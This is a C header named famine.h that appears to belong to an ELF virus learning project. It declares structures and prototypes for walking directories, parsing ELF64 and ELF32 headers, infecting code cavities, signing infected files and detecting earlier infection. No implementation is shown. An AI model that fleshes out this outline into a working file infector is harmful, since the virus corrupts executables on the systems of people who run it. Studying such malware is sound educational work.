#ifndef FAMINE_H
#define FAMINE_H

/* Includes */
#include <dirent.h> // struct dirent
#include <elf.h> // Elf64_Ehdr, Elf64_Phdr
#include <stddef.h> // size_t
#include <stdint.h> // uintX_t

/* Defines */
#define SIGNATURE "famine"
#define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1)

/* Structures */
typedef struct s_file {
	const char *path;
	int fd;
	unsigned char *map;
	size_t size;
} t_file;

typedef struct s_elf64 {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
} t_elf64;

typedef struct s_elf32 {
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
} t_elf32;

/* Prototypes */
void scan_directory(const char *path);
void process_entry(const char *path, struct dirent *entry);
void process_file(const char *path);

int open_file(t_file *file, const char *path);
void close_file(t_file *file);
int map_file(t_file *file);
int unmap_file(t_file *file);

void process_elf(t_file *file);
int is_valid_elf(t_file *file);

void process_elf64(t_file *file);
int parse_elf64(t_file *file, t_elf64 *elf64);
uint64_t elf64_find_next_segment(Elf64_Phdr *phdr, uint32_t phnum, uint32_t index);

void infect_elf64(t_file *file, t_elf64 *elf64);
int sign_elf64_cavity(t_file *file, t_elf64 *elf64);


int is_already_infected(t_file *file);
void infect_elf(t_file *file);

#endif
